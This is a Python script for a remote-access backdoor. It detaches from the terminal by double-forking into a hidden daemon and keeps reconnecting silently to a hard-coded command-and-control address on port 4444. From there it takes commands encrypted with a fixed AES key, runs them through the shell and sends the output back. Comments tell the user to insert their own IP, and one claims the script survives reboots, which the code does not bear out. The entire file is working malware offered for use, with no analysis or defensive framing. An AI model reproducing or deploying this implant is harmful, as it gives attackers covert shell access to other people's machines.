#!/usr/bin/env python3
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad
import socket, subprocess, os, platform, time, sys, base64

# ======== CHANGE TO YOUR WINDOWS IP ========
C2_IP = "192.168.1.167"    # ← YOUR WINDOWS IP
C2_PORT = 4444
# ===========================================

KEY = b'ThisIsA16ByteKey'  
IV = b'16ByteIV12345678'   # Fixed IV

def encrypt(data): 
    if isinstance(data, str): data = data.encode()
    cipher = AES.new(KEY, AES.MODE_CBC, IV)
    ct_bytes = cipher.encrypt(pad(data, AES.block_size))
    return base64.b64encode(ct_bytes)

def decrypt(enc_data):
    try:
        enc_data = base64.b64decode(enc_data)
        cipher = AES.new(KEY, AES.MODE_CBC, IV)
        pt = unpad(cipher.decrypt(enc_data), AES.block_size)
        return pt.decode()
    except: return "decrypt_error"

def daemonize():
    """Run as background daemon"""
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except: sys.exit(1)
    os.chdir("/")
    os.setsid()
    os.umask(0)
    try:
        pid = os.fork()
        if pid > 0: sys.exit(0)
    except: sys.exit(1)
    sys.stdout.flush(); sys.stderr.flush()

def connect():
    """Main connection loop - survives reboots"""
    while True:
        try:
            s = socket.socket()
            s.settimeout(30)
            s.connect((C2_IP, C2_PORT))  # Your Windows IP
            s.send(encrypt(f"{platform.system()}|{platform.node()}|READY"))
            
            while True:
                cmd_encrypted = s.recv(4096)
                if not cmd_encrypted: break
                    
                cmd = decrypt(cmd_encrypted)
                if cmd == "exit": break
                if cmd == "decrypt_error": continue
                
                # Execute command with full privileges
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True, timeout=60)
                output = result.stdout + result.stderr
                s.send(encrypt(output))
                
        except Exception as e:
            time.sleep(30)  # Silent retry
        finally:
            try: s.close()
            except: pass

if __name__ == "__main__":
    daemonize()  # Run as hidden daemon
    connect()
